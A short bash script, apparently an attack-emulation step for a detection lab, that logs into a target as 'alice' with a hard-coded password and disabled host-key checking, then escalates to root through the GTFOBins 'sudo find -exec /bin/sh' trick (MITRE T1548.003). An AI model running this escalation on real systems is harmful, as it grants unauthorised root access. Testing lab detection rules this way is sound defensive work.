#!/bin/bash
# T1548.003 Sudo abuse. alice may run only /usr/bin/find as root, which GTFOBins
# turns into a root shell. Expected detection: lab rule 100201.
source "$(dirname "$0")/lib.sh"
SSH="sshpass -p sunshine1 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null alice@$TARGET_IP"
step "Logged in as alice; listing sudo rights"
$SSH 'sudo -l'
step "Escalating to root via sudo find -exec"
$SSH "sudo find /etc/hostname -exec /bin/sh -c 'id; whoami' \\;"
